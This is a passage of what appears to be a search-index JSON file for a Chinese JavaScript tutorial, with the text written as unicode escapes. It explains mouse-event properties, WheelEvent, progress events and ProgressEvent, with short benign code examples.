\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9875\u9762\u9ad8\u5ea6\u4e3a2000\u50cf\u7d20\uff0c\u4f1a\u4ea7\u751f\u5782\u76f4\u6eda\u52a8\u6761\u3002\u6eda\u52a8\u5230\u9875\u9762\u5e95\u90e8\uff0c\u70b9\u51fb\u9f20\u6807\u8f93\u51fa\u7684 pageY \u503c\u4f1a\u63a5\u8fd12000\u3002","title":"MouseEvent.pageX\uff0cMouseEvent.pageY"},{"location":"events/mouse/#mouseeventrelatedtarget","text":"MouseEvent.relatedTarget \u5c5e\u6027\u8fd4\u56de\u4e8b\u4ef6\u7684\u76f8\u5173\u8282\u70b9\u3002\u5bf9\u4e8e\u90a3\u4e9b\u6ca1\u6709\u76f8\u5173\u8282\u70b9\u7684\u4e8b\u4ef6\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u4e0b\u8868\u5217\u51fa\u4e0d\u540c\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u503c\u548c relatedTarget \u5c5e\u6027\u503c\u4e49\u3002 \u4e8b\u4ef6\u540d\u79f0 target \u5c5e\u6027 relatedTarget \u5c5e\u6027 focusin \u63a5\u53d7\u7126\u70b9\u7684\u8282\u70b9 \u4e27\u5931\u7126\u70b9\u7684\u8282\u70b9 focusout \u4e27\u5931\u7126\u70b9\u7684\u8282\u70b9 \u63a5\u53d7\u7126\u70b9\u7684\u8282\u70b9 mouseenter \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 mouseleave \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 mouseout \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 mouseover \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 dragenter \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 dragexit \u5c06\u8981\u79bb\u5f00\u7684\u8282\u70b9 \u5c06\u8981\u8fdb\u5165\u7684\u8282\u70b9 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /* HTML \u4ee3\u7801\u5982\u4e0b <div id=\"outer\" style=\"height:50px;width:50px;border:1px solid black;\"> <div id=\"inner\" style=\"height:25px;width:25px;border:1px solid black;\"></div> </div> */ var inner = document . getElementById ( 'inner' ); inner . addEventListener ( 'mouseover' , function ( event ) { console . log ( '\u8fdb\u5165' + event . target . id + ' \u79bb\u5f00' + event . relatedTarget . id ); }, false ); inner . addEventListener ( 'mouseenter' , function ( event ) { console . log ( '\u8fdb\u5165' + event . target . id + ' \u79bb\u5f00' + event . relatedTarget . id ); }); inner . addEventListener ( 'mouseout' , function ( event ) { console . log ( '\u79bb\u5f00' + event . target . id + ' \u8fdb\u5165' + event . relatedTarget . id ); }); inner . addEventListener ( \"mouseleave\" , function ( event ){ console . log ( '\u79bb\u5f00' + event . target . id + ' \u8fdb\u5165' + event . relatedTarget . id ); }); // \u9f20\u6807\u4ece outer \u8fdb\u5165inner\uff0c\u8f93\u51fa // \u8fdb\u5165inner \u79bb\u5f00outer // \u8fdb\u5165inner \u79bb\u5f00outer // \u9f20\u6807\u4ece inner\u8fdb\u5165 outer\uff0c\u8f93\u51fa // \u79bb\u5f00inner \u8fdb\u5165outer // \u79bb\u5f00inner \u8fdb\u5165outer","title":"MouseEvent.relatedTarget"},{"location":"events/mouse/#mouseevent_2","text":"","title":"MouseEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"events/mouse/#mouseeventgetmodifierstate","text":"MouseEvent.getModifierState \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6709\u6ca1\u6709\u6309\u4e0b\u7279\u5b9a\u7684\u529f\u80fd\u952e\u3002\u5b83\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u8868\u793a \u529f\u80fd\u952e \u7684\u5b57\u7b26\u4e32\u3002 1 2 3 document . addEventListener ( 'click' , function ( e ) { console . log ( e . getModifierState ( 'CapsLock' )); }, false ); \u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u4e86\u89e3\u7528\u6237\u662f\u5426\u6309\u4e0b\u4e86\u5927\u5199\u952e\u3002","title":"MouseEvent.getModifierState()"},{"location":"events/mouse/#wheelevent","text":"","title":"WheelEvent \u63a5\u53e3"},{"location":"events/mouse/#_3","text":"WheelEvent \u63a5\u53e3\u7ee7\u627f\u4e86 MouseEvent \u5b9e\u4f8b\uff0c\u4ee3\u8868\u9f20\u6807\u6eda\u8f6e\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002\u76ee\u524d\uff0c\u9f20\u6807\u6eda\u8f6e\u76f8\u5173\u7684\u4e8b\u4ef6\u53ea\u6709\u4e00\u4e2a wheel \u4e8b\u4ef6\uff0c\u7528\u6237\u6eda\u52a8\u9f20\u6807\u7684\u6eda\u8f6e\uff0c\u5c31\u751f\u6210\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b WheelEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 WheelEvent \u5b9e\u4f8b\u3002 1 var wheelEvent = new WheelEvent ( type , options ); WheelEvent() \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\uff0c\u5bf9\u4e8e\u6eda\u8f6e\u4e8b\u4ef6\u6765\u8bf4\uff0c\u8fd9\u4e2a\u503c\u76ee\u524d\u53ea\u80fd\u662f wheel \u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u7684\u5c5e\u6027\u9664\u4e86 Event \u3001 UIEvent \u7684\u914d\u7f6e\u5c5e\u6027\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u63a5\u53d7\u4ee5\u4e0b\u51e0\u4e2a\u5c5e\u6027\uff0c\u6240\u6709\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684\u3002 deltaX \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u6c34\u5e73\u6eda\u52a8\u91cf\uff0c\u9ed8\u8ba4\u503c\u662f 0.0\u3002 deltaY \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u5782\u76f4\u6eda\u52a8\u91cf\uff0c\u9ed8\u8ba4\u503c\u662f 0.0\u3002 deltaZ \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684 Z \u8f74\u6eda\u52a8\u91cf\uff0c\u9ed8\u8ba4\u503c\u662f 0.0\u3002 deltaMode \uff1a\u6570\u503c\uff0c\u8868\u793a\u76f8\u5173\u7684\u6eda\u52a8\u4e8b\u4ef6\u7684\u5355\u4f4d\uff0c\u9002\u7528\u4e8e\u4e0a\u9762\u4e09\u4e2a\u5c5e\u6027\u3002 0 \u8868\u793a\u6eda\u52a8\u5355\u4f4d\u4e3a\u50cf\u7d20\uff0c 1 \u8868\u793a\u5355\u4f4d\u4e3a\u884c\uff0c 2 \u8868\u793a\u5355\u4f4d\u4e3a\u9875\uff0c\u9ed8\u8ba4\u4e3a 0 \u3002","title":"\u6982\u8ff0"},{"location":"events/mouse/#_4","text":"WheelEvent \u4e8b\u4ef6\u5b9e\u4f8b\u9664\u4e86\u5177\u6709 Event \u548c MouseEvent \u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u8fd8\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\uff0c\u4f46\u662f\u6ca1\u6709\u81ea\u5df1\u7684\u5b9e\u4f8b\u65b9\u6cd5\u3002 \u4e0b\u9762\u7684\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 WheelEvent.deltaX \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u6c34\u5e73\u6eda\u52a8\u91cf\u3002 WheelEvent.deltaY \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u5782\u76f4\u6eda\u52a8\u91cf\u3002 WheelEvent.deltaZ \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684 Z \u8f74\u6eda\u52a8\u91cf\u3002 WheelEvent.deltaMode \uff1a\u6570\u503c\uff0c\u8868\u793a\u4e0a\u9762\u4e09\u4e2a\u5c5e\u6027\u7684\u5355\u4f4d\uff0c 0 \u662f\u50cf\u7d20\uff0c 1 \u662f\u884c\uff0c 2 \u662f\u9875\u3002","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"events/progress/","text":"\u8fdb\u5ea6\u4e8b\u4ef6 \u00b6 \u8fdb\u5ea6\u4e8b\u4ef6\u7684\u79cd\u7c7b \u00b6 \u8fdb\u5ea6\u4e8b\u4ef6\u7528\u6765\u63cf\u8ff0\u8d44\u6e90\u52a0\u8f7d\u7684\u8fdb\u5ea6\uff0c\u4e3b\u8981\u7531 AJAX \u8bf7\u6c42\u3001 <img> \u3001 <audio> \u3001 <video> \u3001 <style> \u3001 <link> \u7b49\u5916\u90e8\u8d44\u6e90\u7684\u52a0\u8f7d\u89e6\u53d1\uff0c\u7ee7\u627f\u4e86 ProgressEvent \u63a5\u53e3\u3002\u5b83\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u79cd\u4e8b\u4ef6\u3002 abort \uff1a\u5916\u90e8\u8d44\u6e90\u4e2d\u6b62\u52a0\u8f7d\u65f6\uff08\u6bd4\u5982\u7528\u6237\u53d6\u6d88\uff09\u89e6\u53d1\u3002\u5982\u679c\u53d1\u751f\u9519\u8bef\u5bfc\u81f4\u4e2d\u6b62\uff0c\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 error \uff1a\u7531\u4e8e\u9519\u8bef\u5bfc\u81f4\u5916\u90e8\u8d44\u6e90\u65e0\u6cd5\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 load \uff1a\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u6210\u529f\u65f6\u89e6\u53d1\u3002 loadstart \uff1a\u5916\u90e8\u8d44\u6e90\u5f00\u59cb\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 loadend \uff1a\u5916\u90e8\u8d44\u6e90\u505c\u6b62\u52a0\u8f7d\u65f6\u89e6\u53d1\uff0c\u53d1\u751f\u987a\u5e8f\u6392\u5728 error \u3001 abort \u3001 load \u7b49\u4e8b\u4ef6\u7684\u540e\u9762\u3002 progress \uff1a\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u89e6\u53d1\u3002 timeout \uff1a\u52a0\u8f7d\u8d85\u65f6\u65f6\u89e6\u53d1\u3002 \u6ce8\u610f\uff0c\u9664\u4e86\u8d44\u6e90\u4e0b\u8f7d\uff0c\u6587\u4ef6\u4e0a\u4f20\u4e5f\u5b58\u5728\u8fd9\u4e9b\u4e8b\u4ef6\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 image . addEventListener ( 'load' , function ( event ) { image . classList . add ( 'finished' ); }); image . addEventListener ( 'error' , function ( event ) { image . style . display = 'none' ; }); \u4e0a\u9762\u4ee3\u7801\u5728\u56fe\u7247\u5143\u7d20\u52a0\u8f7d\u5b8c\u6210\u540e\uff0c\u4e3a\u56fe\u7247\u5143\u7d20\u6dfb\u52a0\u4e00\u4e2a finished \u7684 Class\u3002\u5982\u679c\u52a0\u8f7d\u5931\u8d25\uff0c\u5c31\u628a\u56fe\u7247\u5143\u7d20\u7684\u6837\u5f0f\u8bbe\u7f6e\u4e3a\u4e0d\u663e\u793a\u3002 \u6709\u65f6\u5019\uff0c\u56fe\u7247\u52a0\u8f7d\u4f1a\u5728\u811a\u672c\u8fd0\u884c\u4e4b\u524d\u5c31\u5b8c\u6210\uff0c\u5c24\u5176\u662f\u5f53\u811a\u672c\u653e\u7f6e\u5728\u7f51\u9875\u5e95\u90e8\u7684\u65f6\u5019\uff0c\u56e0\u6b64\u6709\u53ef\u80fd load \u548c error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6839\u672c\u4e0d\u4f1a\u6267\u884c\u3002\u6240\u4ee5\uff0c\u6bd4\u8f83\u53ef\u9760\u7684\u65b9\u5f0f\uff0c\u662f\u7528 complete \u5c5e\u6027\u5148\u5224\u65ad\u4e00\u4e0b\u662f\u5426\u52a0\u8f7d\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 function loaded () { // ... } if ( image . complete ) { loaded (); } else { image . addEventListener ( 'load' , loaded ); } \u7531\u4e8e DOM \u7684\u5143\u7d20\u8282\u70b9\u6ca1\u6709\u63d0\u4f9b\u662f\u5426\u52a0\u8f7d\u9519\u8bef\u7684\u5c5e\u6027\uff0c\u6240\u4ee5 error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6700\u597d\u653e\u5728 <img> \u5143\u7d20\u7684 HTML \u4ee3\u7801\u4e2d\uff0c\u8fd9\u6837\u624d\u80fd\u4fdd\u8bc1\u53d1\u751f\u52a0\u8f7d\u9519\u8bef\u65f6\u767e\u5206\u4e4b\u767e\u4f1a\u6267\u884c\u3002 1 < img src = \"/wrong/url\" onerror = \"this.style.display='none';\" /> loadend \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u53d6\u4ee3 abort \u4e8b\u4ef6\u3001 load \u4e8b\u4ef6\u3001 error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u56e0\u4e3a\u5b83\u603b\u662f\u5728\u8fd9\u4e9b\u4e8b\u4ef6\u4e4b\u540e\u53d1\u751f\u3002 1 2 3 4 5 req . addEventListener ( 'loadend' , loadEnd , false ); function loadEnd ( e ) { console . log ( '\u4f20\u8f93\u7ed3\u675f\uff0c\u6210\u529f\u5931\u8d25\u672a\u77e5' ); } loadend \u4e8b\u4ef6\u672c\u8eab\u4e0d\u63d0\u4f9b\u5173\u4e8e\u8fdb\u5ea6\u7ed3\u675f\u7684\u539f\u56e0\uff0c\u4f46\u53ef\u4ee5\u7528\u5b83\u6765\u505a\u6240\u6709\u52a0\u8f7d\u7ed3\u675f\u573a\u666f\u90fd\u9700\u8981\u505a\u7684\u4e00\u4e9b\u64cd\u4f5c\u3002 \u53e6\u5916\uff0c error \u4e8b\u4ef6\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u6027\u8d28\uff0c\u5c31\u662f\u4e0d\u4f1a\u5192\u6ce1\u3002\u6240\u4ee5\uff0c\u5b50\u5143\u7d20\u7684 error \u4e8b\u4ef6\uff0c\u4e0d\u4f1a\u89e6\u53d1\u7236\u5143\u7d20\u7684 error \u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002 ProgressEvent \u63a5\u53e3 \u00b6 ProgressEvent \u63a5\u53e3\u4e3b\u8981\u7528\u6765\u63cf\u8ff0\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u7684\u8fdb\u5ea6\uff0c\u6bd4\u5982 AJAX \u52a0\u8f7d\u3001 <img> \u3001 <video> \u3001 <style> \u3001 <link> \u7b49\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u3002\u8fdb\u5ea6\u76f8\u5173\u7684\u4e8b\u4ef6\u90fd\u7ee7\u627f\u4e86\u8fd9\u4e2a\u63a5\u53e3\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e86 ProgressEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u4e8b\u4ef6\u5b9e\u4f8b\u3002 1 new ProgressEvent ( type , options ) ProgressEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u7c7b\u578b\uff0c\u8fd9\u4e2a\u53c2\u6570\u662f\u5fc5\u987b\u7684\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u5c5e\u6027\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u914d\u7f6e\u5bf9\u8c61\u9664\u4e86\u53ef\u4ee5\u4f7f\u7528 Event \u63a5\u53e3\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u5c5e\u6027\uff0c\u6240\u6709\u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684\u3002 lengthComputable \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u52a0\u8f7d\u7684\u603b\u91cf\u662f\u5426\u53ef\u4ee5\u8ba1\u7b97\uff0c\u9ed8\u8ba4\u662f false \u3002 loaded \uff1a\u6574\u6570\uff0c\u8868\u793a\u5df2\u7ecf\u52a0\u8f7d\u7684\u91cf\uff0c\u9ed8\u8ba4\u662f 0 \u3002 total \uff1a\u6574\u6570\uff0c\u8868\u793a\u9700\u8981\u52a0\u8f7d\u7684\u603b\u91cf\uff0c\u9ed8\u8ba4\u662f 0 \u3002 ProgressEvent \u5177\u6709\u5bf9\u5e94\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 ProgressEvent.lengthComputable ProgressEvent.loaded ProgressEvent.total \u5982\u679c ProgressEvent.lengthComputable \u4e3a false \uff0c ProgressEvent.total \u5b9e\u9645\u4e0a\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var p = new ProgressEvent ( 'load' , { lengthComputable : true , loaded : 30 , total : 100 , }); document . body . addEventListener ( 'load' , function ( e ) { console . log ( '\u5df2\u7ecf\u52a0\u8f7d\uff1a' + ( e . loaded / e . total ) * 100 + '%' ); }); document . body . dispatchEvent ( p ); // \u5df2\u7ecf\u52a0\u8f7d\uff1a30% \u4e0a\u9762\u4ee3\u7801\u5148\u6784\u9020\u4e00\u4e2a load \u4e8b\u4ef6\uff0c\u629b\u51fa\u540e\u88ab\u76d1\u542c\u51fd\u6570\u6355\u6349\u5230\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var xhr = new XMLHttpRequest (); xhr . addEventListener ( 'progress' , updateProgress , false ); xhr . addEventListener ( 'load' , transferComplete , false ); xhr . addEventListener ( 'error' , transferFailed , false ); xhr . addEventListener ( 'abort' , transferCanceled , false ); xhr . open (); function updateProgress ( e ) { if ( e . lengthComputable ) { var percentComplete = e . loaded / e . total ; } else { console . log ( '\u4e0d\u80fd\u8ba1\u7b97\u8fdb\u5ea6' ); } } function transferComplete ( e ) { console . log ( '\u4f20\u8f93\u7ed3\u675f' ); } function transferFailed ( evt ) { console . log ( '\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef' ); } function transferCanceled ( evt ) { console . log ( '\u7528\u6237\u53d6\u6d88\u4e86\u4f20\u8f93' ); } \u4e0a\u9762\u662f\u4e0b\u8f7d\u8fc7\u7a0b\u7684\u8fdb\u5ea6\u4e8b\u4ef6\uff0c\u8fd8\u5b58\u5728\u4e0a\u4f20\u8fc7\u7a0b\u7684\u8fdb\u5ea6\u4e8b\u4ef6\u3002\u8fd9\u65f6\u6240\u6709\u76d1\u542c\u51fd\u6570\u90fd\u8981\u653e\u5728 XMLHttpRequest.upload \u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 6 7 8 var xhr = new XMLHttpRequest (); xhr . upload . addEventListener ( 'progress' , updateProgress , false ); xhr . upload . addEventListener ( 'load' , transferComplete , false ); xhr . upload . addEventListener ( 'error' , transferFailed , false ); xhr . upload . addEventListener ( 'abort' , transferCanceled , false ); xhr . open ();","title":"\u8fdb\u5ea6\u4e8b\u4ef6"},{"location":"events/progress/#_1","text":"","title":"\u8fdb\u5ea6\u4e8b\u4ef6"},{"location":"events/progress/#_2","text":"\u8fdb\u5ea6\u4e8b\u4ef6\u7528\u6765\u63cf\u8ff0\u8d44\u6e90\u52a0\u8f7d\u7684\u8fdb\u5ea6\uff0c\u4e3b\u8981\u7531 AJAX \u8bf7\u6c42\u3001 <img> \u3001 <audio> \u3001 <video> \u3001 <style> \u3001 <link> \u7b49\u5916\u90e8\u8d44\u6e90\u7684\u52a0\u8f7d\u89e6\u53d1\uff0c\u7ee7\u627f\u4e86 ProgressEvent \u63a5\u53e3\u3002\u5b83\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u79cd\u4e8b\u4ef6\u3002 abort \uff1a\u5916\u90e8\u8d44\u6e90\u4e2d\u6b62\u52a0\u8f7d\u65f6\uff08\u6bd4\u5982\u7528\u6237\u53d6\u6d88\uff09\u89e6\u53d1\u3002\u5982\u679c\u53d1\u751f\u9519\u8bef\u5bfc\u81f4\u4e2d\u6b62\uff0c\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 error \uff1a\u7531\u4e8e\u9519\u8bef\u5bfc\u81f4\u5916\u90e8\u8d44\u6e90\u65e0\u6cd5\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 load \uff1a\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u6210\u529f\u65f6\u89e6\u53d1\u3002 loadstart \uff1a\u5916\u90e8\u8d44\u6e90\u5f00\u59cb\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 loadend \uff1a\u5916\u90e8\u8d44\u6e90\u505c\u6b62\u52a0\u8f7d\u65f6\u89e6\u53d1\uff0c\u53d1\u751f\u987a\u5e8f\u6392\u5728 error \u3001 abort \u3001 load \u7b49\u4e8b\u4ef6\u7684\u540e\u9762\u3002 progress \uff1a\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u89e6\u53d1\u3002 timeout \uff1a\u52a0\u8f7d\u8d85\u65f6\u65f6\u89e6\u53d1\u3002 \u6ce8\u610f\uff0c\u9664\u4e86\u8d44\u6e90\u4e0b\u8f7d\uff0c\u6587\u4ef6\u4e0a\u4f20\u4e5f\u5b58\u5728\u8fd9\u4e9b\u4e8b\u4ef6\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 image . addEventListener ( 'load' , function ( event ) { image . classList . add ( 'finished' ); }); image . addEventListener ( 'error' , function ( event ) { image . style . display = 'none' ; }); \u4e0a\u9762\u4ee3\u7801\u5728\u56fe\u7247\u5143\u7d20\u52a0\u8f7d\u5b8c\u6210\u540e\uff0c\u4e3a\u56fe\u7247\u5143\u7d20\u6dfb\u52a0\u4e00\u4e2a finished \u7684 Class\u3002\u5982\u679c\u52a0\u8f7d\u5931\u8d25\uff0c\u5c31\u628a\u56fe\u7247\u5143\u7d20\u7684\u6837\u5f0f\u8bbe\u7f6e\u4e3a\u4e0d\u663e\u793a\u3002 \u6709\u65f6\u5019\uff0c\u56fe\u7247\u52a0\u8f7d\u4f1a\u5728\u811a\u672c\u8fd0\u884c\u4e4b\u524d\u5c31\u5b8c\u6210\uff0c\u5c24\u5176\u662f\u5f53\u811a\u672c\u653e\u7f6e\u5728\u7f51\u9875\u5e95\u90e8\u7684\u65f6\u5019\uff0c\u56e0\u6b64\u6709\u53ef\u80fd load \u548c error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6839\u672c\u4e0d\u4f1a\u6267\u884c\u3002\u6240\u4ee5\uff0c\u6bd4\u8f83\u53ef\u9760\u7684\u65b9\u5f0f\uff0c\u662f\u7528 complete \u5c5e\u6027\u5148\u5224\u65ad\u4e00\u4e0b\u662f\u5426\u52a0\u8f7d\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 function loaded () { // ... } if ( image . complete ) { loaded (); } else { image . addEventListener ( 'load' , loaded ); } \u7531\u4e8e DOM \u7684\u5143\u7d20\u8282\u70b9\u6ca1\u6709\u63d0\u4f9b\u662f\u5426\u52a0\u8f7d\u9519\u8bef\u7684\u5c5e\u6027\uff0c\u6240\u4ee5 error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6700\u597d\u653e\u5728 <img> \u5143\u7d20\u7684 HTML \u4ee3\u7801\u4e2d\uff0c\u8fd9\u6837\u624d\u80fd\u4fdd\u8bc1\u53d1\u751f\u52a0\u8f7d\u9519\u8bef\u65f6\u767e\u5206\u4e4b\u767e\u4f1a\u6267\u884c\u3002 1 < img src = \"/wrong/url\" onerror = \"this.style.display='none';\" /> loadend \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u53d6\u4ee3 abort \u4e8b\u4ef6\u3001 load \u4e8b\u4ef6\u3001 error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u56e0\u4e3a\u5b83\u603b\u662f\u5728\u8fd9\u4e9b\u4e8b\u4ef6\u4e4b\u540e\u53d1\u751f\u3002 1 2 3 4 5 req . addEventListener ( 'loadend' , loadEnd , false ); function loadEnd ( e ) { console . log ( '\u4f20\u8f93\u7ed3\u675f\uff0c\u6210\u529f\u5931\u8d25\u672a\u77e5' ); } loadend \u4e8b\u4ef6\u672c\u8eab\u4e0d\u63d0\u4f9b\u5173\u4e8e\u8fdb\u5ea6\u7ed3\u675f\u7684\u539f\u56e0\uff0c\u4f46\u53ef\u4ee5\u7528\u5b83\u6765\u505a\u6240\u6709\u52a0\u8f7d\u7ed3\u675f\u573a\u666f\u90fd\u9700\u8981\u505a\u7684\u4e00\u4e9b\u64cd\u4f5c\u3002 \u53e6\u5916\uff0c error \u4e8b\u4ef6\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u6027\u8d28\uff0c\u5c31\u662f\u4e0d\u4f1a\u5192\u6ce1\u3002\u6240\u4ee5\uff0c\u5b50\u5143\u7d20\u7684 error \u4e8b\u4ef6\uff0c\u4e0d\u4f1a\u89e6\u53d1\u7236\u5143\u7d20\u7684 error \u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002","title":"\u8fdb\u5ea6\u4e8b\u4ef6\u7684\u79cd\u7c7b"},{"location":"events/progress/#progressevent","text":"ProgressEvent \u63a5\u53e3\u4e3b\u8981\u7528\u6765\u63cf\u8ff0\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u7684\u8fdb\u5ea6\uff0c\u6bd4\u5982 AJAX \u52a0\u8f7d\u3001 <img> \u3001 <video> \u3001 <style> \u3001 <link> \u7b49\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u3002\u8fdb\u5ea6\u76f8\u5173\u7684\u4e8b\u4ef6\u90fd\u7ee7\u627f\u4e86\u8fd9\u4e2a\u63a5\u53e3\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e86 ProgressEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u4e8b\u4ef6\u5b9e\u4f8b\u3002 1 new ProgressEvent ( type , options ) ProgressEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u7c7b\u578b\uff0c\u8fd9\u4e2a\u53c2\u6570\u662f\u5fc5\u987b\u7684\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u5c5e\u6027\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u914d\u7f6e\u5bf9\u8c61\u9664\u4e86\u53ef\u4ee5\u4f7f\u7528 Event \u63a5\u53e3\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u5c5e\u6027\uff0c\u6240\u6709\u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684\u3002 lengthComputable \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u52a0\u8f7d\u7684\u603b\u91cf\u662f\u5426\u53ef\u4ee5\u8ba1\u7b97\uff0c\u9ed8\u8ba4\u662f false \u3002 loaded 